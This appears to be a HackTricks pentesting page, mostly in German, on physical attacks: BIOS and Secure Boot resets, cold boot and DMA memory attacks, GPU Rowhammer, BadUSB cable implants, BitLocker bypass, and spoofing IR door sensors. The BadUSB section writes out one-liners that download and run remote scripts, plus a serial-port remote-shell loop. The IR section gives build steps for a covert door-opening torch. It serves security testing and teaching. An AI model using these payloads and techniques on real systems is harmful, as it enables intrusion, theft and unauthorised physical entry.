# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

Das **Zurücksetzen des BIOS** kann auf verschiedene Arten erfolgen. Die meisten Motherboards enthalten eine **Batterie**, die beim Entfernen für etwa **30 Minuten** die BIOS-Einstellungen einschließlich des Passworts zurücksetzt. Alternativ kann ein **Jumper auf dem Motherboard** angepasst werden, um diese Einstellungen zurückzusetzen, indem bestimmte Pins verbunden werden.

In Situationen, in denen Hardware-Anpassungen nicht möglich oder praktisch sind, bieten **Software-Tools** eine Lösung. Das Starten eines Systems von einer **Live CD/USB** mit Distributionen wie **Kali Linux** bietet Zugriff auf Tools wie **_killCmos_** und **_CmosPWD_**, die bei der Wiederherstellung von BIOS-Passwörtern helfen können.

Wenn das BIOS-Passwort unbekannt ist, führt eine falsche Eingabe **dreimal** normalerweise zu einem Fehlercode. Dieser Code kann auf Websites wie [https://bios-pw.org](https://bios-pw.org) verwendet werden, um möglicherweise ein nutzbares Passwort zu erhalten.

### UEFI Security

Bei modernen Systemen, die **UEFI** statt traditionellem BIOS verwenden, kann das Tool **chipsec** genutzt werden, um UEFI-Einstellungen zu analysieren und zu ändern, einschließlich des Deaktivierens von **Secure Boot**. Dies kann mit dem folgenden Befehl erreicht werden:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM-Analyse und Cold Boot Attacks

RAM behält Daten kurzzeitig nach dem Abschalten der Stromversorgung, normalerweise für **1 bis 2 Minuten**. Diese Persistenz kann durch das Auftragen von kalten Substanzen wie flüssigem Stickstoff auf **10 Minuten** verlängert werden. Während dieses verlängerten Zeitraums kann mit Tools wie **dd.exe** und **volatility** ein **memory dump** zur Analyse erstellt werden.

---

## GPU Rowhammer gegen Page Tables

Moderne GPU Rowhammer-Angriffe werden deutlich nützlicher, wenn sie **GPU virtual-memory metadata** statt gewöhnlicher Buffer angreifen. Neuere Arbeiten zu **GDDR6 NVIDIA Ampere GPUs** zeigen, dass ein Angreifer, der unprivilegierten CUDA-Code ausführt, GPU-spezifische Hammering-Pattern aufbauen, **memory massaging** verwenden kann, um Paging-Strukturen in verwundbaren Rows zu platzieren, und dann Bits in der **last-level page table** oder einer Zwischenstufe wie einem **page directory** kippen kann. Sobald ein einzelner Translation-Eintrag korrumpiert ist, kann der Angreifer **arbitrary GPU memory read/write** bootstrappen und anschließend in eine Kompromittierung des Hosts übergehen.

### Exploitation Pattern

1. **Profile hammerable rows** in GDDR6 und baue refresh-aware / non-uniform Hammering-Pattern, die In-DRAM-Mitigations umgehen.
2. **Massage GPU allocations**, sodass der Treiber Page-Translation-Strukturen an angreifbaren physischen Positionen platziert, statt sie im standardmäßigen geschützten Pool zu behalten. Praktisch kann das bedeuten, den low-memory page-table-Bereich zu erschöpfen und große sparsame UVM-Mappings mit kontrollierten Strides zu sprayen.
3. **Flip translation metadata** wie **PFN** oder aperture-bezogene Bits in einem page-table- / page-directory-Eintrag, sodass die vom Angreifer kontrollierte virtuelle Seite auf page-table pages, beliebigen GPU memory oder host-visible system mappings aufgelöst wird.
4. Reuse des gefälschten Mappings, um zusätzliche Translation-Einträge umzuschreiben und in **arbitrary GPU memory read/write** über mehrere GPU contexts hinweg zu eskalieren.

### Host Pivot und Mitigations

- Mit **IOMMU disabled** können gefälschte system-aperture mappings beliebigen **host physical memory** für die GPU zugänglich machen und die GPU-Primitive in eine vollständige Host-Kompromittierung verwandeln.
- **GDDRHammer** zielt auf last-level page-table entries, während **GeForge** zeigt, dass die Korrumpierung einer page-directory-Ebene einfacher sein kann, weil ein einzelner Bitflip einen größeren Translation-Teilbaum umleiten kann. Behandle nicht nur eine Paging-Ebene als sicherheitskritisch.
- **IOMMU** ist weiterhin wichtig, weil es den direkten arbitrary-host-memory-Pfad blockiert, der von GDDRHammer/GeForge genutzt wird, aber es ist **keine vollständige Mitigation**. **GPUBreach** zeigt einen zweiten Pivot, bei dem der Angreifer GPU-schreibbare, vom Treiber besessene CPU-Buffer korrumpiert und dann NVIDIA-Driver-Memory-Safety-Bugs auslöst, um eine Kernel-Write-Primitive und eine **root shell** zu erhalten, selbst wenn IOMMU aktiviert ist.
- **System-level ECC** ist ein praktischer Hardening-Schritt auf unterstützten Workstation-/Server-GPUs. Consumer GPUs ohne ECC haben eine schwächere Defensivfläche.
- Diese Angriffe sind nicht rein theoretisch: **GeForge** meldete **1.171** Bitflips auf einer RTX 3060 und **202** auf einer RTX A6000, was ausreichte, um eine funktionierende Host-Privilege-Escalation-Kette aufzubauen.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** ist ein Tool für **physical memory manipulation** über DMA, kompatibel mit Interfaces wie **FireWire** und **Thunderbolt**. Es ermöglicht das Umgehen von Login-Prozessen, indem Memory gepatcht wird, um jedes Passwort zu akzeptieren. Allerdings ist es gegen Systeme mit **Windows 10** wirkungslos.

---

## Live CD/USB für Systemzugriff

Das Ersetzen von System-Binaries wie **_sethc.exe_** oder **_Utilman.exe_** durch eine Kopie von **_cmd.exe_** kann eine Eingabeaufforderung mit Systemrechten bereitstellen. Tools wie **chntpw** können verwendet werden, um die **SAM**-Datei einer Windows-Installation zu bearbeiten und Passwortänderungen zu ermöglichen.

**Kon-Boot** ist ein Tool, das das Einloggen in Windows-Systeme ohne Kenntnis des Passworts erleichtert, indem es vorübergehend den Windows-Kernel oder UEFI modifiziert. Mehr Informationen gibt es unter [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Umgang mit Windows-Sicherheitsfunktionen

### Boot- und Recovery-Shortcuts

- **Supr**: BIOS-Einstellungen aufrufen.
- **F8**: Recovery mode betreten.
- Drücken von **Shift** nach dem Windows-Banner kann autologon umgehen.

### BAD USB Devices

Geräte wie **Rubber Ducky** und **Teensyduino** dienen als Plattformen zur Erstellung von **bad USB** devices, die beim Anschluss an einen Zielcomputer vordefinierte Payloads ausführen können.

### Volume Shadow Copy

Administratorrechte ermöglichen das Erstellen von Kopien sensibler Dateien, einschließlich der **SAM**-Datei, über PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3-basierte Implants wie **Evil Crow Cable Wind** verstecken sich in USB-A→USB-C- oder USB-C↔USB-C-Kabeln, enumerieren sich ausschließlich als USB keyboard und stellen ihren C2-Stack über Wi-Fi bereit. Der Operator muss das Kabel nur vom Opfer-Host aus mit Strom versorgen, einen Hotspot mit dem Namen `Evil Crow Cable Wind` und dem Passwort `123456789` erstellen und zu [http://cable-wind.local/](http://cable-wind.local/) (oder dessen DHCP-Adresse) browsen, um die eingebettete HTTP-Oberfläche zu erreichen.
- Die Browser-UI bietet Tabs für *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* und *Config*. Gespeicherte Payloads werden pro OS getaggt, Keyboard-Layouts werden on the fly gewechselt, und VID/PID-Strings können verändert werden, um bekannte Peripherals zu imitieren.
- Da das C2 im Kabel lebt, kann ein Telefon Payloads bereitstellen, die Ausführung auslösen und Wi-Fi-Credentials verwalten, ohne das Host-OS zu berühren — ideal für kurze physische Intrusions mit geringer Verweildauer.

### OS-aware AutoExec payloads

- AutoExec-Regeln binden eine oder mehrere payloads, die unmittelbar nach der USB-Enumeration ausgelöst werden. Das Implant führt eine leichte OS-Fingerprinting durch und wählt das passende Script aus.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) oder `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Da die Ausführung unbeaufsichtigt erfolgt, kann bereits das Austauschen eines Ladekabels initialen Zugriff unter dem Kontext des angemeldeten Users ermöglichen.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Eine gespeicherte payload öffnet eine Konsole und fügt eine Schleife ein, die alles ausführt, was auf dem neuen USB-Serial-Device ankommt. Eine minimale Windows-Variante ist:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Das Implant hält den USB-CDC-Kanal offen, während sein ESP32-S3 einen TCP-Client (Python-Skript, Android-APK oder Desktop-Executable) zurück zum Operator startet. Alle Bytes, die in der TCP-Sitzung eingegeben werden, werden in die obige serielle Schleife weitergeleitet, was Remote Command Execution sogar auf air-gapped Hosts ermöglicht. Die Ausgabe ist begrenzt, daher führen Operatoren typischerweise Blind Commands aus (Account-Erstellung, Staging zusätzlicher Tools usw.).

### HTTP OTA update surface

- Derselbe Web-Stack stellt normalerweise auch unauthenticated Firmware-Updates bereit. Evil Crow Cable Wind lauscht auf `/update` und flasht alles, was hochgeladen wird:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (z. B. flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## Bypassing BitLocker Encryption

BitLocker-Verschlüsselung kann potenziell umgangen werden, wenn das **recovery password** in einer Speicherabbilddatei (**MEMORY.DMP**) gefunden wird. Tools wie **Elcomsoft Forensic Disk Decryptor** oder **Passware Kit Forensic** können dafür verwendet werden.

---

## Social Engineering für das Hinzufügen eines Recovery Keys

Ein neuer BitLocker recovery key kann durch Social-Engineering-Taktiken hinzugefügt werden, indem ein Benutzer dazu gebracht wird, einen Befehl auszuführen, der einen neuen recovery key aus Nullen hinzufügt und dadurch den Entschlüsselungsprozess vereinfacht.

---

## Ausnutzen von Chassis Intrusion / Maintenance Switches zum Factory-Reset des BIOS

Viele moderne Laptops und Small-Form-Factor-Desktops enthalten einen **chassis-intrusion switch**, der vom Embedded Controller (EC) und der BIOS/UEFI-Firmware überwacht wird. Während der Hauptzweck des Schalters darin besteht, einen Alarm auszulösen, wenn ein Gerät geöffnet wird, implementieren Hersteller manchmal eine **undokumentierte recovery shortcut**, die ausgelöst wird, wenn der Schalter in einem bestimmten Muster betätigt wird.

### Wie der Angriff funktioniert

1. Der Schalter ist mit einem **GPIO interrupt** auf dem EC verdrahtet.
2. Die auf dem EC laufende Firmware verfolgt die **Zeitabstände und Anzahl der Betätigungen**.
3. Wenn ein hart kodiertes Muster erkannt wird, ruft der EC eine *mainboard-reset*-Routine auf, die **den Inhalt des system NVRAM/CMOS löscht**.
4. Beim nächsten Boot lädt das BIOS Standardwerte – **supervisor password, Secure Boot keys und alle benutzerdefinierten Konfigurationen werden gelöscht**.

> Sobald Secure Boot deaktiviert ist und das Firmware password weg ist, kann der Angreifer einfach irgendein externes OS-Image booten und uneingeschränkten Zugriff auf die internen Laufwerke erhalten.

### Praxisbeispiel – Framework 13 Laptop

Der recovery shortcut für den Framework 13 (11th/12th/13th-gen) ist:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Nach dem zehnten Zyklus setzt die EC ein Flag, das dem BIOS vorgibt, beim nächsten Neustart NVRAM zu löschen. Der gesamte Vorgang dauert ~40 s und erfordert **nichts außer einem Schraubendreher**.

### Generische Exploitation Procedure

1. Power-on oder Suspend-Resume des Ziels, damit die EC läuft.
2. Entferne die Unterseite, um den intrusion/maintenance switch freizulegen.
3. Reproduziere das vendor-spezifische Toggle-Muster (siehe Dokumentation, Foren oder reverse-engineere die EC firmware).
4. Wieder zusammenbauen und rebooten – die firmware protections sollten deaktiviert sein.
5. Boote ein Live-USB (z. B. Kali Linux) und führe die übliche post-exploitation aus (credential dumping, data exfiltration, Implantieren bösartiger EFI binaries, etc.).

### Detection & Mitigation

* Protokolliere chassis-intrusion events in der OS management console und korreliere sie mit unerwarteten BIOS-Resets.
* Nutze **tamper-evident seals** an Schrauben/Covern, um das Öffnen zu erkennen.
* Halte Geräte in **physically controlled areas**; gehe davon aus, dass physical access gleich full compromise bedeutet.
* Falls verfügbar, deaktiviere das vendor „maintenance switch reset“-Feature oder verlange eine zusätzliche kryptografische Authorisierung für NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).
- Ein Plastikgehäuse blockiert, dass Emitter und receiver direkt aufeinander schauen, sodass der Controller annimmt, jede validierte carrier komme von einer nahen Reflexion, und steuert ein relay an, das den door strike öffnet.
- Sobald der Controller glaubt, dass ein Target vorhanden ist, ändert er oft die outbound modulation envelope, aber der receiver akzeptiert weiterhin jeden burst, der zum gefilterten carrier passt.

### Attack Workflow
1. **Capture the emission profile** – klemme einen logic analyser an die controller pins, um sowohl die pre-detection- als auch die post-detection waveforms aufzuzeichnen, die die interne IR LED antreiben.
2. **Replay only the “post-detection” waveform** – entferne/ignoriere den Standard-Emitter und treibe eine externe IR LED mit dem bereits ausgelösten Muster von Anfang an. Da der receiver nur auf pulse count/frequency achtet, behandelt er den spoofed carrier als echte Reflexion und setzt die relay line.
3. **Gate the transmission** – sende den carrier in abgestimmten bursts (z. B. Zehntel-Sekunden on, ähnlich off), um die minimale pulse count zu liefern, ohne die AGC oder die interference handling logic des receivers zu sättigen. Dauerhafte Emission macht den Sensor schnell unempfindlich und verhindert, dass das relay auslöst.

### Long-Range Reflective Injection
- Das Ersetzen der Bench-LED durch eine High-Power-IR-Diode, einen MOSFET-Driver und Fokussierungsoptik ermöglicht zuverlässiges Auslösen aus ~6 m Entfernung.
- Der Angreifer braucht keine line-of-sight zur receiver aperture; das Ausrichten des Strahls auf Innenwände, Regale oder Türrahmen, die durch Glas sichtbar sind, lässt reflektierte Energie in das ~30°-Sichtfeld eintreten und ahmt eine Handbewegung aus kurzer Distanz nach.
- Da die receiver nur schwache Reflexionen erwarten, kann ein deutlich stärkerer externer Strahl von mehreren Oberflächen reflektieren und dennoch über der detection threshold bleiben.

### Weaponised Attack Torch
- Das Einbauen des Drivers in eine kommerzielle Taschenlampe versteckt das Werkzeug offen sichtbar. Ersetze die sichtbare LED durch eine High-Power-IR-LED, die zum Band des receivers passt, füge einen ATtiny412 (oder ähnlich) hinzu, um die ≈30 kHz bursts zu erzeugen, und nutze einen MOSFET, um den LED-Strom zu senken.
- Eine teleskopische Zoom-Linse verengt den Strahl für Reichweite/Präzision, während ein Vibrationsmotor unter MCU-Kontrolle haptische Bestätigung liefert, dass die modulation aktiv ist, ohne sichtbares Licht auszusenden.
- Das Durchschalten mehrerer gespeicherter modulation patterns (leicht unterschiedliche carrier frequencies und envelopes) erhöht die Kompatibilität über umbenannte sensor families hinweg und erlaubt es dem Operator, reflektierende Oberflächen abzusuchen, bis das relay hörbar klickt und die Tür freigibt.

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
